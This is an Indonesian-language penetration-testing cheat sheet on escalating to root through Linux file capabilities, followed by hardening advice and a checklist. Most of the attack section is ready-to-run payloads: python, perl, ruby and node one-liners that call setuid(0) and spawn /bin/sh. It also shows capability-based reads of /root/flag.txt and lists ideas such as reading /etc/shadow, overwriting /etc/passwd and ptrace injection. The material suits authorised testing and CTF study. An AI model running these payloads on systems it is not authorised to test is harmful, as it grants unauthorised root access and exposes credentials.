# Capabilities — Payload Shell Cheat Sheet

> **Tujuan:** Enumerasi Linux capabilities pada binary dan spawn shell dengan privilege root (uid=0) tanpa perlu SUID bit atau sudo, dalam pengujian penetrasi (Penetration Testing).
> **Tools utama:** `getcap`, [GTFOBins](https://gtfobins.github.io)

---

## Penjelasan Singkat

**Linux Capabilities** memecah privilege root menjadi unit-unit granular yang dapat ditempelkan pada binary. Capability seperti `cap_setuid` memungkinkan proses **mengubah uid-nya sendiri menjadi 0 (root)** — artinya binary ber-capability dapat spawn root shell tanpa perlu SUID bit maupun sudo.

| Item | Detail |
|------|--------|
| **Cara Deteksi** | `getcap -r / 2>/dev/null` |
| **Ciri Khas** | Capability menempel pada binary (`python3 cap_setuid=ep`) |
| **Hasil Eksploitasi** | Shell dengan `uid=0(root)` |

> **Suffix Capability:** `=ep` berarti *effective* + *permitted*. Suffix `e` (effective) membuat capability langsung aktif saat binary dieksekusi.

---

## Langkah 1: Deteksi & Identifikasi

```bash
# Enumerasi seluruh binary dengan Linux capabilities
getcap -r / 2>/dev/null
```

Contoh output:

```text
/usr/bin/python3.11 cap_setuid=ep
/usr/bin/perl cap_setuid=ep
/usr/bin/ruby cap_setuid=ep
```

> **Perhatikan:** Entry `cap_setuid` pada interpreter (python, perl, ruby, node) adalah **tiket langsung ke root** karena interpreter dapat memanggil `setuid(0)` dari dalam script.

---

## Langkah 2: Payload Shell per Capability (GTFOBins → Capabilities)

### cap_setuid — Spawn Root Shell

```bash
# cap_setuid pada python — spawn root shell
python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh")'

# cap_setuid pada perl
perl -e 'use POSIX (setuid); setuid(0); exec "/bin/sh";'

# cap_setuid pada ruby
ruby -e 'Process.setuid(0); exec "/bin/sh"'

# cap_setuid pada node
node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: "inherit"})'
```

| Binary | Capability | Payload |
|--------|------------|---------|
| `python3` | `cap_setuid=ep` | `os.setuid(0)` + `execl("/bin/sh")` |
| `perl` | `cap_setuid=ep` | `setuid(0)` + `exec "/bin/sh"` |
| `ruby` | `cap_setuid=ep` | `Process.setuid(0)` + `exec` |
| `node` | `cap_setuid=ep` | `setuid(0)` + `spawn("/bin/sh")` |

---

### cap_dac_read_search — Baca Berkas Apa Pun Tanpa Shell

```bash
getcap /usr/bin/cat   # → cat cap_dac_read_search=ep
cat /root/flag.txt    # → bisa baca langsung walau bukan root
```

| Binary | Capability | Payload |
|--------|------------|---------|
| `cat` | `cap_dac_read_search=ep` | Baca berkas apa pun tanpa shell |
| `cp` | `cap_dac_read_search=ep` | Salin berkas apa pun walau bukan root |

> **Catatan:** Capability `cap_setuid` memungkinkan proses **mengubah uid-nya sendiri menjadi 0 (root)** tanpa perlu SUID bit atau sudo — cukup panggil `setuid(0)` dari interpreter (Python/Perl/Ruby/Node) lalu spawn shell. Sementara `cap_dac_read_search` cukup untuk **membaca berkas apa pun** (misal flag) tanpa perlu shell sama sekali.

---

## Capabilities Lain yang Perlu Diwaspadai

| Capability | Dampak | Contoh Eksploitasi |
|------------|--------|--------------------|
| `cap_setgid` | Ganti gid ke grup mana pun (misal `shadow`) | Baca `/etc/shadow` |
| `cap_dac_override` | Tulis/ubah berkas apa pun | Timpa `/etc/passwd` |
| `cap_net_raw` | Craft paket mentah | Sniffing / spoofing jaringan |
| `cap_sys_admin` | Hampir setara admin | Mount, namespace, ptrace |
| `cap_sys_ptrace` | Inject kode ke proses root | Hijack proses berprivilege tinggi |

---

## Catatan Penting & Pengerasan Keamanan (Hardening)

- **Setel Ulang Capabilities** Hapus capability berbahaya dengan `setcap -r <binary>` dan batasi hanya untuk binary yang benar-benar membutuhkan.
- **Batas Wajar Penggunaan** Berikan capability spesifik alih-alih root penuh — misal `cap_net_raw` untuk ping, jangan `cap_setuid` pada interpreter.
- **Audit Rutin** Lakukan audit berkala dengan `getcap -r /` dan pastikan tidak ada capability berbahaya menempel pada interpreter.
- **Hindari Interpreter** Jangan tempelkan `cap_setuid`/`cap_dac_override` pada interpreter (python, perl, ruby, node) karena semuanya bisa spawn shell.

---

## Checklist Penetration Testing Capabilities

- [ ] Enumerasi capabilities dengan `getcap -r / 2>/dev/null`
- [ ] Identifikasi capability berbahaya (`cap_setuid`, `cap_dac_read_search`, `cap_dac_override`)
- [ ] Cek setiap binary di [GTFOBins](https://gtfobins.github.io) → bagian **Capabilities**
- [ ] Pilih payload shell yang sesuai dengan interpreter yang ditemukan
- [ ] Verifikasi dengan `id` → `uid=0(root)`
- [ ] Dokumentasikan temuan dan langkah mitigasi